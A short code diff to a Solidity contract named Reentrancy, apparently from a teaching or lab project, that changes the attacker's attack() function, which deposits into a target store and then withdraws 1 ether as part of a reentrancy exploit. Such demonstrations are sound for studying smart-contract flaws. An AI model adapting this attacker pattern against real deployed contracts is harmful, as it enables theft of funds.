@@ -30,7 +30,8 @@ contract Reentrancy is IReceiver {
   }
 
   function attack() external payable {
-    tokenStore.deposit{value: msg.value}();
+    require(msg.value > 0, "Value must be > 0!");
+    tokenStore.deposit{value: 1 ether}();
     tokenStore.withdraw(1 ether);
   }
 }
